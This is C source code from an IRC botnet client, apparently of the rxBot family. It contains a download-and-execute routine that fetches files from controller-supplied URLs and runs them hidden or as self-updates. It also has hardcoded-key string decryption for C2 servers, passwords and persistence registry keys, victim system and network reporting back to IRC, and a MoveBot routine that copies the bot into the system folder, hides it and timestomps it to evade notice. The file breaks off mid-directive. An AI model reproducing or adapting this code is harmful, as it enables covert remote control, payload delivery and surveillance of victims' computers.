#include "../headers/includes.h"
#include "../headers/functions.h"
#include "../headers/config/strings.h"

#ifndef NO_DOWNLOAD
extern char str_thread_fail[];
extern char str_quit_upd[];
// function for downloading files/updating
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;

	NTHREAD dl = *((NTHREAD *)param);
	NTHREAD *dls = (NTHREAD *)param;
	dls->gotinfo = TRUE;
	IRC* irc=(IRC*)dl.conn;

	char dlfrom[MAX_HOSTNAME];
	char dlto[MAX_PATH];
	strncpy(dlfrom,dl.data1,sizeof(dlfrom));
	strncpy(dlto,dl.data2,sizeof(dlto));

	HANDLE fh = fInternetOpenUrl(ih, dlfrom, NULL, 0, 0, 0);
	if (fh != NULL)
	{
		HANDLE f = CreateFile(dlto, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (f < (HANDLE)1)
		{
			if (!dl.silent)
				irc->privmsg(dl.target,"%s Couldn't open file for writing: %s.",(dl.bdata1?update_title:download_title),dlto);

			fInternetCloseHandle(fh);
			clearthread(dl.threadnum);
			ExitThread(0);
		}

		total = 0;
		start = GetTickCount();
		char *fileTotBuff=(char *)malloc(512000);
		do
		{
			ZeroMemory(buffer,sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			WriteFile(f, buffer, r, &d, NULL);
			
			if ((total) < 512000)
			{
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
		}
		while (r > 0);

		speed = total / (((GetTickCount() - start) / 1000) + 1);
		free(fileTotBuff);
		CloseHandle(f);
		fInternetCloseHandle(fh);

		if (!dl.silent)
			irc->privmsg(dl.target,"%s File download: %.1fKB to: %s @ %.1fKB/sec.",(dl.bdata1?update_title:download_title), total/1024.0, dlto, speed/1024.0);

		//download isn't an update
		if (!dl.bdata1 && dl.bdata2)
		{
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			BOOL hide=dl.bdata3, wait=dl.verbose;
			char path[MAX_PATH];
			strncpy(path,dlto,sizeof(path));
			if (!fPathRemoveFileSpec(path))
			{
				if (!dl.silent)
					irc->privmsg(dl.target,"%s Couldn't parse path, error: <%d>", download_title, GetLastError());
				return 1;
			}
			ZeroMemory(&si,sizeof(si));
			ZeroMemory(&pi,sizeof(pi));
			si.cb=sizeof(si);
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow = (hide?SW_HIDE:SW_SHOW);

			if (!CreateProcess(NULL,dlto,NULL,NULL,FALSE,0,NULL,path,&si,&pi))
			{
				if (!dl.silent)
					irc->privmsg(dl.target,"%s Failed to create process: \"%s\", error: <%d>", download_title, dlto, GetLastError());
				return 1;
			}
			else
			{
				DWORD start=GetTickCount();//record this before the privmsg so we aren't off
				if (!dl.silent)
					irc->privmsg(dl.target,"%s Created process: \"%s\", PID: <%d>",download_title,dlto,pi.dwProcessId);
				
				if (dl.verbose)
				{	
					WaitForSingleObject(pi.hProcess,INFINITE);
					DWORD stop=GetTickCount();
					char ttime[120],stime[120];
					stime[0]='\0';
					DWORD total = ((stop - start)/1000);
					DWORD hours = (total%86400)/3600;
					DWORD minutes = ((total%86400)%3600)/60;
					DWORD seconds = ((total%86400)%3600)%60;
					if (hours>0)
					{
						sprintf(ttime," %d%s",hours,(hours==1?" hour":" hours"));
						strcat(stime,ttime);
					}
					sprintf(ttime," %.2d:%.2d",minutes,seconds);
					strcat(stime,ttime);

					irc->privmsg(dl.target,"%s Process Finished: \"%s\", Total Running Time: %s.",download_title,dlto,stime);
				}
				if (pi.hProcess) CloseHandle(pi.hProcess);
				if (pi.hThread) CloseHandle(pi.hThread);
			}
		
		// download is an update
		}
		else if (dl.bdata1)
		{
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));
			ZeroMemory(&sinfo, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dlto, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS|DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE)
			{
				uninstall(TRUE,(dl.idata1==1?TRUE:FALSE));
				irc->quit(str_quit_upd);
				Sleep(FLOOD_DELAY);
				irc->disconnect();
				fWSACleanup();
				ExitProcess(EXIT_SUCCESS);
			}
			else
			{
				if (!dl.silent)
					irc->privmsg(dl.target,"%s Update failed: Error executing file: %s.",update_title,dlto);
			}
		}
	}
	else
	{
		if (!dl.silent)
			irc->privmsg(dl.target,"%s Bad URL or DNS Error, error: <%d>",(dl.bdata1?update_title:download_title),GetLastError());
	}
	clearthread(dl.threadnum);
	ExitThread(0);
}
#endif

void Crypt(unsigned char *inp, DWORD inplen, unsigned char *key, DWORD keylen)
{
	//we will consider size of sbox 256 bytes
	//(extra byte are only to prevent any mishep just in case)
	unsigned char Sbox[257], Sbox2[257], temp = 0 , k = 0;
	unsigned long i=0, j=0, t=0, x=0;
	unsigned char OurUnSecuredKey[49];
	OurUnSecuredKey[0]=10; OurUnSecuredKey[1]=41; OurUnSecuredKey[2]=32; OurUnSecuredKey[3]=30;
	OurUnSecuredKey[4]=84; OurUnSecuredKey[5]=43; OurUnSecuredKey[6]=21; OurUnSecuredKey[7]=12;
	OurUnSecuredKey[8]=99; OurUnSecuredKey[9]=93; OurUnSecuredKey[10]=04; OurUnSecuredKey[11]=41;
	OurUnSecuredKey[12]=11; OurUnSecuredKey[13]=30; OurUnSecuredKey[14]=54; OurUnSecuredKey[15]=04;
	OurUnSecuredKey[16]=30; OurUnSecuredKey[17]=51; OurUnSecuredKey[18]=76; OurUnSecuredKey[19]=86;
	OurUnSecuredKey[20]=21; OurUnSecuredKey[21]=40; OurUnSecuredKey[22]=78; OurUnSecuredKey[23]=53;
	OurUnSecuredKey[24]=56; OurUnSecuredKey[25]=9; OurUnSecuredKey[26]=65; OurUnSecuredKey[27]=19;
	OurUnSecuredKey[28]=31; OurUnSecuredKey[29]=17; OurUnSecuredKey[30]=74; OurUnSecuredKey[31]=28;
	OurUnSecuredKey[32]=12; OurUnSecuredKey[33]=81; OurUnSecuredKey[34]=80; OurUnSecuredKey[35]=79;
	OurUnSecuredKey[36]=86; OurUnSecuredKey[37]=26; OurUnSecuredKey[38]=66; OurUnSecuredKey[39]=31;
	OurUnSecuredKey[40]=56; OurUnSecuredKey[41]=92; OurUnSecuredKey[42]=56; OurUnSecuredKey[43]=85;
	OurUnSecuredKey[44]=44; OurUnSecuredKey[45]=65; OurUnSecuredKey[46]=44; OurUnSecuredKey[47]=88;
	OurUnSecuredKey[48]=0;
	
	//static const int OurKeyLen = _tcslen(OurUnSecuredKey);    
	unsigned int OurKeyLen = strlen((char *)OurUnSecuredKey);  

    //always initialize the arrays with zero
	ZeroMemory(Sbox, sizeof(Sbox));
	ZeroMemory(Sbox2, sizeof(Sbox2));

    //initialize sbox i
	for(i = 0; i < 256U; i++)
		Sbox[i] = (unsigned char)i;

    //whether user has sent any input key
	if(keylen) {
		//initialize the sbox2 with user key
		for(i = 0; i < 256U ; i++) {
			if(j == keylen)
				j = 0;
			Sbox2[i] = key[j++];
		}    
	} else {
		//initialize the sbox2 with our key
		for(i = 0; i < 256U ; i++) {
			if(j == (unsigned long)OurKeyLen)
				j = 0;
			Sbox2[i] = OurUnSecuredKey[j++];
		}
	}

	j = 0 ; //Initialize j
	//scramble sbox1 with sbox2
	for(i = 0; i < 256; i++) {
		j = (j + (unsigned long) Sbox[i] + (unsigned long) Sbox2[i]) % 256U ;
		temp =  Sbox[i];                    
		Sbox[i] = Sbox[j];
		Sbox[j] =  temp;
	}

	i = j = 0;
	for(x = 0; x < inplen; x++) {
		//increment i
		i = (i + 1U) % 256U;
		//increment j
		j = (j + (unsigned long) Sbox[i]) % 256U;

		//Scramble SBox #1 further so encryption routine will
		//will repeat itself at great interval
		temp = Sbox[i];
		Sbox[i] = Sbox[j] ;
		Sbox[j] = temp;

		//Get ready to create pseudo random  byte for encryption key
		t = ((unsigned long) Sbox[i] + (unsigned long) Sbox[j]) %  256U ;

		//get the random byte
		k = Sbox[t];

		//xor with the data and done
		inp[x] = (unsigned char)(inp[x] ^ k);
	}

#ifdef _DEBUG
	printf("crypt: %s\n",inp);
#endif
	return;
}

#ifndef NO_CRYPT
extern char cononstart[];
void decryptstrings(int authsize, int versionsize, int serversize)
{
	int i;
	
	Crypt((unsigned char *)filename,strlen(filename),NULL,0);

	Crypt((unsigned char *)version,strlen(version),NULL,0);
	
#ifndef NO_SERVICE
	Crypt((unsigned char *)servicename,strlen(servicename),NULL,0);
	Crypt((unsigned char *)servicedisplayname,strlen(servicedisplayname),NULL,0);
	Crypt((unsigned char *)servicedesc,strlen(servicedesc),NULL,0);
#else
	Crypt((unsigned char *)runkey.subkey,strlen(runkey.subkey),NULL,0);
	Crypt((unsigned char *)runkey.name,strlen(runkey.name),NULL,0);
#endif

	Crypt((unsigned char *)password,strlen(password),NULL,0);
	
	for(i=0;i < authsize;i++)
		Crypt((unsigned char *)authost[i],strlen(authost[i]),NULL,0);

#ifndef NO_VERSION_REPLY
	for(i=0;i < versionsize;i++)
		Crypt((unsigned char *)versionlist[i],strlen(versionlist[i]),NULL,0);
#endif

	for(i=0;i < serversize;i++)
	{
		Crypt((unsigned char *)servers[i].host,strlen(servers[i].host),NULL,0);
		Crypt((unsigned char *)servers[i].pass,strlen(servers[i].pass),NULL,0);
		Crypt((unsigned char *)servers[i].chan,strlen(servers[i].chan),NULL,0);
		Crypt((unsigned char *)servers[i].chanpass,strlen(servers[i].chanpass),NULL,0);
		Crypt((unsigned char *)servers[i].modeonconn,strlen(servers[i].modeonconn),NULL,0);
#ifndef NO_MODEONJOIN
		Crypt((unsigned char *)servers[i].modeonjoin,strlen(servers[i].modeonjoin),NULL,0);
#endif
		Crypt((unsigned char *)servers[i].warningchan,strlen(servers[i].warningchan),NULL,0);
	}

#ifndef NO_MELT
	Crypt((unsigned char *)meltkey.subkey,strlen(meltkey.subkey),NULL,0);
	Crypt((unsigned char *)meltkey.name,strlen(meltkey.name),NULL,0);
#endif
#ifndef NO_RECORD_UPTIME
	Crypt((unsigned char *)rupkey.subkey,strlen(rupkey.subkey),NULL,0);
	Crypt((unsigned char *)rupkey.name,strlen(rupkey.name),NULL,0);
#endif
#ifndef NO_INSTALLED_TIME
	Crypt((unsigned char *)itkey.subkey,strlen(itkey.subkey),NULL,0);
	Crypt((unsigned char *)itkey.name,strlen(itkey.name),NULL,0);
#endif
	return;
};
#endif


extern char netinfo_title[];
extern char sysinfo_title[];

char *Uptime(DWORD TickCount,DWORD Startup, BOOL vDays/*=FALSE*/)
{
	static char buffer[50];
	ZeroMemory(buffer,sizeof(buffer));

	DWORD dwTotal=(TickCount/1000)-(Startup/1000);
	DWORD dwDays=dwTotal/86400;
	DWORD dwHours=(dwTotal%86400)/3600;
	DWORD dwMins=((dwTotal%86400)%3600)/60;
	
	if (vDays || dwDays > 0)
		sprintf(buffer,"%d day%s %0.2d:%0.2d",dwDays,(dwDays==1?"":"s"),dwHours,dwMins);
	else
		sprintf(buffer,"%0.2d:%0.2d",dwHours,dwMins);

	return buffer;
}

#ifndef NO_RECORD_UPTIME
BOOL bRecUpdated;

char *RecordUptime(void)
{
	static char buffer[50];
	ZeroMemory(buffer,sizeof(buffer));

	DWORD dwTotal=GetRecord()/1000;
	if (dwTotal==0) {
		sprintf(buffer,"Error <%d>.",GetLastError());
		return buffer;
	}
	DWORD dwDays=dwTotal/86400;
	DWORD dwHours=(dwTotal%86400)/3600;
	DWORD dwMins=((dwTotal%86400)%3600)/60;

	sprintf(buffer,"%d day%s %0.2d:%0.2d",dwDays,(dwDays==1?"":"s"),dwHours,dwMins);
	return buffer;
}


BOOL UpdateRecord(void)
{
	BOOL bSuccess=FALSE;
	DWORD CurRecord;
	DWORD dwGTC=GetTickCount();
	if (!bRecUpdated)
	{	// If it hasnt been updated its worth checking again.
		CurRecord=RegQuery(rupkey.hkey,rupkey.subkey,rupkey.name,bSuccess);

		if (bSuccess)
		{
			if (dwGTC > CurRecord)
				if (RegWrite(rupkey.hkey,rupkey.subkey,rupkey.name,dwGTC))
					return TRUE;
		}
		else
		{
			if (RegWrite(rupkey.hkey,rupkey.subkey,rupkey.name,dwGTC))
				return TRUE;
		}
	}
	else
	{	// If its already been updated then it will keep updating so we can skip the query.
		RegWrite(rupkey.hkey,rupkey.subkey,rupkey.name,dwGTC);
		return TRUE;
	}
	return FALSE;
}

DWORD GetRecord(void)
{
	BOOL bSuccess=FALSE;
	DWORD CurRecord;
	CurRecord=RegQuery(rupkey.hkey,rupkey.subkey,rupkey.name,bSuccess);

	if (bSuccess)
		return CurRecord;
	else
		return 0;

	return 0;
}

DWORD WINAPI RecordUptimeThread(LPVOID param)
{
	bRecUpdated=FALSE;
	if (!noadvapi32) {
		while (1) {
			bRecUpdated=UpdateRecord();
			Sleep(RUPTIME_DELAY);
		}
	}
	ExitThread(0);
}
#endif //NO_RECORD_UPTIME




#ifndef NO_SYSINFO

// asm for cpuspeed() (used for counting cpu cycles)
#pragma warning( disable : 4035 )
inline unsigned __int64 GetCycleCount(void)
{
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
}
#pragma warning( default : 4035 )

// cpu speed function
unsigned __int64 GetCPUSpeed(void)
{
	unsigned __int64 startcycle, speed, num, num2;

	do {
		startcycle = GetCycleCount();
		Sleep(1000);
		speed = ((GetCycleCount()-startcycle)/1000000);
	} while (speed > 1000000);

	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return (speed);
}

// function used for sysinfo
void sysinfo(char *target, void* conn)
{
	IRC* irc=(IRC*)conn;
	char *os="???", os2[140];
	char sinfo[IRCLINE];
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}

	DWORD dwcu=256;
	DWORD dwcb=256;
	char CurrentUser[256];
	char CurrentBox[256];
	fGetUserName(CurrentUser,&dwcu);
	fGetComputerName(CurrentBox,&dwcb);

	char sysdir[MAX_PATH];
    GetSystemDirectory(sysdir,sizeof(sysdir));

    char date[70], time[70];
    GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
    GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);

	MEMORYSTATUS memstat;
	ZeroMemory(&memstat,sizeof(memstat));
	GlobalMemoryStatus(&memstat); // load memory info into memstat

	char mtotal[50],mavail[50];
	sprintf(mtotal,commaI64(memstat.dwTotalPhys/1024));
	sprintf(mavail,commaI64(memstat.dwAvailPhys/1024));

	_snprintf(sinfo, IRCLINE, "%s [CPU]: %I64uMHz. [RAM]: %sKB total, %sKB free. [OS]: Windows %s (%d.%d - %d). [Sysdir]: %s. [Computer Name]: %s. [Current User]: %s. [Date]: %s. [Time]: %s. [Uptime]: %s.",
		sysinfo_title, GetCPUSpeed(), mtotal, mavail, replacestr(os,"Service Pack ","SP"), 
		verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, sysdir, CurrentBox, CurrentUser, date, time, Uptime(GetTickCount(),0,TRUE));

	irc->privmsg(target,sinfo);
	return;
}
#endif

#ifndef NO_NETINFO
DWORD band(BOOL bdownload)
{
	DWORD rval=0;
	
	//DWORD download2=0,band=0;
	char *buffer=NULL;
	
	DWORD count;//number of table entries

	ULONG buf_size=0;
	MIB_IFROW *ifr;
	MIB_IFTABLE *ift;
	DWORD ii=0;
	
	if (fGetIfTable((PMIB_IFTABLE)buffer, &buf_size, TRUE) != ERROR_INSUFFICIENT_BUFFER)
		return 0;

	buffer=(char *)malloc(buf_size);
	if (buffer==NULL)
		return 0;
	ZeroMemory(buffer,buf_size);
	
	if (fGetIfTable((PMIB_IFTABLE)buffer, &buf_size, TRUE) != NO_ERROR)
		return 0;

	ift=(MIB_IFTABLE *)buffer;
	count=ift->dwNumEntries;
	for (ii=0; ii<count; ii++)
	{
		ifr = (ift->table) + ii;
		if(ifr->dwInUcastPkts > 0 && ifr->dwOutUcastPkts > 0)
		{
			if(ifr->dwInUcastPkts == ifr->dwOutUcastPkts)
			{
				ii=ii;
			}
			else
			{
				if (bdownload)
					rval=(DWORD)ifr->dwInOctets;
				else
					rval=(DWORD)ifr->dwOutOctets;
				free(buffer);
				return rval;
			}
		}
	}
	free(buffer);
	return rval;
}

void netinfo(char *target, void* conn)
{
	IRC* irc=(IRC*)conn;
	DWORD n;
	char ctype[8], cname[128];
	static char country[128];
	char ninfo[IRCLINE];
	char tninfo[IRCLINE];

	// get connection type/name
	ZeroMemory(cname,sizeof(cname));
	if (!nowininet) {
		if (!fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0))
			sprintf(cname, "Not connected");
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) 
			sprintf(ctype, "Dial-up");
	 	else 
			sprintf(ctype,  "LAN");
	} else {
		sprintf(ctype, "N/A");
		sprintf(cname, "N/A");
	}
	
	DWORD bandw=0,upbandw=0;
	char downloaded[50],uploaded[50];
	if (!noiphlpapi)
	{
		bandw=band(TRUE);
		upbandw=band(FALSE);
	}
	
	sprintf(downloaded,"%sMB",commaI64(bandw/1048576));
	sprintf(uploaded,"%sMB",commaI64(upbandw/1048576));

	_snprintf(ninfo, IRCLINE,
		"%s [Connection Type]: %s (%s). [Internal IP]: %s. [External IP]: %s. [Hostname]: %s. [Private]: %s.",
		netinfo_title, ctype, cname, inip, exip, host, (PrivateIP(inip)?("Yes"):("No")));

#ifndef NO_BWDISP
	sprintf(tninfo,"[Bandwidth]: Down: %s, Up: %s.",downloaded,uploaded);
	strncat(ninfo,tninfo,sizeof(ninfo));
#endif // NO_BWDISP
	
	irc->privmsg(target,ninfo);
	return;
}
#endif // NO_NETINFO


#ifndef NO_GET_IP_HTTP
extern char str_exip_resolve[];
#endif

DWORD host2ip(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(szHost);

		if (pHE == 0) 
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
} 

#ifndef NO_FLUSHDNS
BOOL FlushDNSCache(void)
{
	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet=fDnsFlushResolverCache();
	return bRet;
}
#endif

#ifndef NO_FLUSHARP
BOOL FlushARPCache(void)
{
    PMIB_IPNETTABLE arp = 0;
    ULONG tsize = 0;
	BOOL bRet = TRUE;
	
    DWORD result = fGetIpNetTable(NULL, &tsize, TRUE);
	switch(result) {
	case ERROR_SUCCESS:
		break;
	case ERROR_INSUFFICIENT_BUFFER:
		arp=(PMIB_IPNETTABLE)malloc(tsize);
		ZeroMemory((LPVOID)arp,tsize);

		if (arp != NULL) {
			if ((result = fGetIpNetTable(arp, &tsize, TRUE)) != ERROR_SUCCESS) {
				//sprintf(logbuf,"%s Error getting ARP cache: <%d>.",flushdns_title,result);
				//addlog(ERRORLOG,logbuf);
				bRet = FALSE;
			}
		} else {
			//sprintf(logbuf,"%s Unable to allocation ARP cache.",flushdns_title);
			//addlog(ERRORLOG,logbuf);
			bRet = FALSE;
		}
		break;
	case ERROR_NO_DATA:
		//sprintf(logbuf,"%s ARP cache is empty.",flushdns_title);
		//addlog(ERRORLOG,logbuf);
		bRet = FALSE;
		break;
	case ERROR_NOT_SUPPORTED:
		//sprintf(logbuf,"%s Not supported by this system.",flushdns_title);
		//addlog(ERRORLOG,logbuf);
		bRet = FALSE;
		break;
	default:
		//sprintf(logbuf,"%s Error getting ARP cache: <%d>.",flushdns_title,result);
		//addlog(ERRORLOG,logbuf);
		bRet = FALSE;
	}

	if (bRet) {
	    for (unsigned int i = 0; i < arp->dwNumEntries; i++)
			fDeleteIpNetEntry(&arp->table[i]);
	}
	free(arp);

	return bRet;
}
#endif

#ifndef NO_GET_IP_HTTP
IPSITES ipsites[]={
	{"http://checkip.dyndns.org","Current IP Address:", "</body></html>"},
	{"http://www.whatismyip.com","Your IP  - ", ""},
};

char *GetExternalIp(void)
{
	HINTERNET httpopen, openurl;
	char buffer[10240];
	char tbuffer[10240];
	static char ip[MAX_IP];
	int sitecount=(sizeof(ipsites)/sizeof(IPSITES));
	int csite=rand()%(sitecount);
	for (int u=0;u<sitecount;u++)
		ipsites[u].tried=FALSE;
	
	DWORD read=0;
	char *check;
	
	int i=0;
	for (i=0;i<=10;i++)
	{
		for (int t=0;t<sitecount*2;t++)
		{
			if (ipsites[csite].tried==TRUE)
				csite=rand()%(sitecount);
			else
				break;
		}
		
		httpopen=fInternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		openurl=fInternetOpenUrl(httpopen,ipsites[csite].site, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
		if (!openurl)
			return 0;
		
		fInternetReadFile(openurl, buffer, sizeof(buffer), &read);
		
		check = strstr(buffer,ipsites[csite].match);
		if (check)
		{
			sprintf(tbuffer,"%s%%s",ipsites[csite].match);
			sscanf(check,tbuffer,ip);
			if (ip)
			{
				fInternetCloseHandle(httpopen);
				fInternetCloseHandle(openurl);
				if(strlen(ipsites[csite].useless) > 0)
					strtok(ip, ipsites[csite].useless); // only the ip.
#ifdef _DEBUG
				printf("GetExternalIp: Recieved From: %s (%i/%i) (%d)\n",ipsites[csite].site,csite,sitecount,read);
#endif
				return ip;
			}
		}
		else
		{
			ipsites[csite].tried=TRUE;
			csite=rand()%(sitecount);
		}
	}

#ifdef _DEBUG
	printf("GetExternalIp: Recieved From: %s (%i/%i) (%d)\n",ipsites[csite].site,csite,sitecount,read);
#endif
	return ip;
}

DWORD WINAPI GetExIP(LPVOID param) 
{
	char *tip=GetExternalIp();

	if (!tip)
	{
		strncpy(exip,inip,sizeof(exip));
	}
	else
		strncpy(exip,tip,sizeof(exip));

	DWORD addr=finet_addr(exip);  
	HOSTENT *hostent=fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
    if (hostent != NULL)
       strncpy(host,hostent->h_name,sizeof(host));
    else 
		strncpy(host,str_exip_resolve,sizeof(host));

	ExitThread(0);
}
#endif
BOOL PrivateIP(const char *ip) {
	if(!ip) return FALSE; if(!strcmp(ip, "")) return FALSE;
	char *tokens[4]; char ipbuf[32];
	strncpy(ipbuf, ip, 32);
	tokens[0]=strtok(ipbuf, ".");
	if(!tokens[0]) return FALSE;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return FALSE; }
	if(!strcmp(tokens[0], "10")) return TRUE;								// Class A private network
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return TRUE;	// Class B Private network
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return TRUE;	// Class C private network
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return TRUE;	// Class Bastart private network :P
	return FALSE;
}


#ifdef _DEBUG
extern char debug_log[];
extern char debug_log_mode[];
//Thanks Akcom
void DbgPrintFile(char *Format, ...)
{
	va_list va;
	va_start(va,Format);
	char buf[1024];
	vsprintf(buf,Format,va);
	va_end(va);
	SYSTEMTIME st;
	GetSystemTime(&st);
	char OutStr[64];
	GetDateFormat(LOCALE_SYSTEM_DEFAULT,0,&st,"MM/dd/yyyy",OutStr,sizeof(OutStr));
	FILE *f=fopen(debug_log,debug_log_mode);
	if (f)
	{
		fprintf(f,"[%s] %s",OutStr,buf);
		fclose(f);
	}
}
#endif

int SplitParams(char *a[MAX_TOKENS],char *line,int depth)
{
	a[0]=strtok(line," ");
	int i;
	for (i=1;i<depth;i++)
	{
		a[i]=strtok(NULL," ");
		if (a[i])
			continue;
		else
			break;
	}
	return i;
}


//http://www.nirsoft.net/vc/isfileexist.html
BOOL FileExists(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
		return TRUE;
}

BOOL IsFolder(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
	{
		if (dwAttr & FILE_ATTRIBUTE_DIRECTORY)
			return TRUE;
		else
			return FALSE;
	}
}

// File size function from OmegaII
size_t FileSize(const char *filename)
{
	unsigned short  multiplier=0, fread_ret=0, feof_ret=0;
	char char_count[1024];
	FILE *stream;

	stream = fopen(filename, "rb");
	while(fread_ret = fread(char_count, sizeof(char), sizeof(char_count), stream))
	{
		if (fread_ret < 1024)
		{
			feof_ret = feof(stream);
			if (feof_ret != 0)
				return (sizeof(char_count) * multiplier)+fread_ret;
			else
				return 0;
		}
		else
			multiplier++;
	}
	return (sizeof(char_count) * multiplier)+fread_ret;
}

BOOL SetFileTime(char *TargetFile)
{
	/*
		Gets the filetime of the computers shell file (usually Explorer.exe), from the registry
		and then sets the target file to the same filetime. The shell file, unless a custom one,
		should be the orignal date of the OS install; this is good for hiding your file when
		located in GetSystemDirectory().
			-SourceX
	*/
	HANDLE hShell;
	FILETIME ft;
	char cWindowsDir[MAX_PATH];
	char *cShellFile;

	GetWindowsDirectory(cWindowsDir,sizeof(cWindowsDir));
	cShellFile=RegQuery(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","Shell");
	if (cShellFile)
	{
		strcat(cWindowsDir,cShellFile);
		hShell=CreateFile(cWindowsDir,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

		if (hShell != INVALID_HANDLE_VALUE) 
		{
			GetFileTime(hShell,(LPFILETIME)NULL,(LPFILETIME)NULL,&ft);
			CloseHandle(hShell);
			hShell = CreateFile(TargetFile,GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

			if (hShell != INVALID_HANDLE_VALUE) 
			{
				SetFileTime(hShell,(LPFILETIME)NULL,(LPFILETIME)NULL,&ft);
				CloseHandle(hShell);

				return TRUE;
			}
		}
	}
	return FALSE;
}

BOOL MoveBot(char *MoveToPath, char *Filename)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MoveToPath,Filename);
	strcpy(CurrentPath,CurrentPathF);
	fPathRemoveFileSpec(CurrentPath);
	
	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF,FALSE)) == FALSE)
		{
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			}
			else
				break;
		}

		SetFileTime(MoveToPathF);
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		
		if (bCFRet)
			return TRUE;
	}
	return FALSE;
}
char *substr(char *input, int start, int end)
{
	static char output[1024];
	//ZeroMemory(output,sizeof(output));
	
	for (int y=0;y<256;y++)
		output[y]='\0';
	
	for (int i=start,t=0;i<=end;i++,t++)
		output[t]=input[i];
	return (output);
}
char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty 
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string 
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found 
			strncpy(temps, str, ptr - str);     // Copy first part 
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

#ifndef NO_WILDCARD
